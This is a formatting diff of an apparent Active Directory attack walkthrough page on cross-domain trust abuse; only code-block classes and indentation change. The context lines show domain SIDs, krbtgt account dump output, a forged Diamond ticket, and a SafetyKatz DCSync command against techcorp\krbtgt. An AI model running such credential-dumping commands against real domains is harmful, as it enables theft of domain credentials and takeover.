@@ -265,7 +265,7 @@ Now that we have done the enumeration and we know exactly how is the Child/Paren
 Child Domain SID: S-1-5-21-210670787-2521448726-163245708
 Parent Domain SID: S-1-5-21-2781415573-3701854478-2406986946
 We have below our Child Domain KRBTGT hashes
-<pre><code><strong> SAM ACCOUNT </strong>
+<pre><code class="language-bash"><strong> SAM ACCOUNT </strong>
 
 <p>SAM Username         : krbtgt
 Account Type         : 30000000 ( USER_OBJECT )
@@ -392,7 +392,7 @@ It is possible to see above that we were able to forge our inter-realm Diamond t
 C:\AD\Tools\Loader.exe -Path C:\Ad\Tools\SafetyKatz.exe -args "%Pwn% /user:techcorp\krbtgt /domain:techcorp.local" "exit”
 <img src="./images/screenshot_318.png" alt="">
 
-<pre><code><strong> SAM ACCOUNT </strong>
+<pre><code class="language-bash"><strong> SAM ACCOUNT </strong>
 
 <p>SAM Username         : krbtgt
 Account Type         : 30000000 ( USER_OBJECT )
@@ -524,7 +524,7 @@ In short, the attack worked because Active Directory trusts domain controllers t
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Domain attacks - Child T</a>
             <a href="part-26-cross-forest-attacks-kerberoast-attack.html">Next: Cross Forest Attacks - Kerbero <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
